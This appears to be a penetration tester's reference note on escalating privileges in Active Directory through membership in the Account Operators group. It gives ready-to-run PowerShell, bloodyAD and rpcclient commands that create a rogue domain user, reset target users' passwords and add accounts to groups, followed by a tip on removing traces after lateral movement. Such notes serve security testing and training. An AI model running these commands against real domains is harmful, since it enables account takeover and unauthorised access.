---
created: 2026-09-03
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---

> [!abstract]+ **Scope**: Privilege escalation through membership in the `Account Operators` group.

- [ ] Confirm membership in the `Account Operators` group (`net user %USERNAME% /domain` or `Get-ADGroupMember`).
- [ ] Enumerate target domain users and non-protected groups (`Get-ADUser` or `Get-ADGroup`).
- [ ] Verify `adminCount` status on target accounts to ensure they are not protected by `AdminSDHolder`.
- [ ] Reset the password of a target non-protected user or add an account to target groups.
- [ ] Authenticate as the target user or use updated group memberships to escalate privileges.
---
## `Account Operators`

>The **`Account Operators`** group is a built-in Windows security group that allows members to **create, modify, and delete non-protected user and computer accounts and groups** across an Active Directory domain.

- Members of `Account Operators` have permissions to modify account credentials, update security attributes, and alter group memberships for objects stored in standard Organizational Units (OUs).
- High-privilege administrative accounts and groups (such as `Domain Admins`, `Enterprise Admins`, and `Administrators`) are protected by `AdminSDHolder` and `SDProp`. These objects have `adminCount = 1`, which enforces protected ACLs and prevents `Account Operators` from modifying them directly.
- Privilege escalation relies on resetting passwords of non-protected accounts that hold administrative delegations or adding accounts to non-protected groups that grant server-level access.

## Checking group membership

- Confirm domain account membership in `Account Operators`:

```powershell
whoami /groups
```

```powershell
net user %USERNAME% /domain
```

```powershell
Get-ADGroupMember -Identity "Account Operators"
```
## Modifying non-protected accounts and groups

### Creating a custom domain user account

- Create a new domain account using PowerShell:

```powershell
New-ADUser -Name "pwnuser" -SamAccountName "pwnuser" -UserPrincipalName "pwnuser@example.com" -AccountPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force) -Enabled $true
```

- Alternatively, create an account remotely from Linux using `bloodyAD`:

```bash
bloodyAD -d example.com -u jdoe -p 'passwd123' --host 10.10.11.5 addUser pwnuser 'P@ssword123!'
```

### Resetting passwords for non-protected accounts

- Reset the password of a target non-protected domain user:

```powershell
Set-ADAccountPassword -Identity "targetuser" -NewPassword (ConvertTo-SecureString "NewP@ssword123!" -AsPlainText -Force) -Reset
```

- Alternatively, reset user passwords remotely via RPC using `rpcclient`:

```bash
rpcclient -U 'example.com\jdoe%passwd123' 10.10.11.5 -c 'setuserpassword2 targetuser new_passwd123!'
```

### Adding accounts to target domain groups

- Add an account to a target non-protected group:

```powershell
Add-ADGroupMember -Identity "IT Support" -Members "jdoe"
```

- Alternatively, add a user to a group remotely using `bloodyAD`:

```bash
bloodyAD -d example.com -u jdoe -p 'passwd123' --host 10.10.11.5 addGroupMember "IT Support" jdoe
```

## Assessing `AdminSDHolder` restrictions

- Active Directory protects high-privilege administrative accounts via the `AdminSDHolder` object and the `SDProp` (Security Descriptor Propagator) background task.
- Check whether a target account or group is protected by `AdminSDHolder`:

```powershell
Get-ADUser -Identity "targetuser" -Properties adminCount | Select-Object Name, adminCount
```

| `adminCount` value | Protection status | Account Operators capability |
| :--- | :--- | :--- |
| `$null` / `0` | Non-protected account | Password reset and group membership modification allowed. |
| `1` | Protected by `AdminSDHolder` | Modification blocked by Active Directory ACL inheritance rules. |

>[!warning] While `Account Operators` cannot directly add members to `Domain Admins` due to `adminCount=1`, modifying non-protected accounts with local administrative rights on servers or workstations allows compromise of those systems.

>[!tip]+
> - Remove created user accounts or group assignments after completing lateral movement:
>
> ```powershell
> Remove-ADGroupMember -Identity "IT Support" -Members "jdoe" -Confirm:$false
> ```
>
> ```powershell
> Remove-ADUser -Identity "pwnuser" -Confirm:$false
> ```

## References and further reading

- [`Account Operators — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-security-groups-in-active-directory#account-operators)
- [`Appendix C: Protected Accounts and Groups in Active Directory — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [`Active Directory Privileged Groups — HackTricks`](https://book.hacktricks.xyz/windows-hardening/active-directory-attacking/privileged-groups#account-operators)
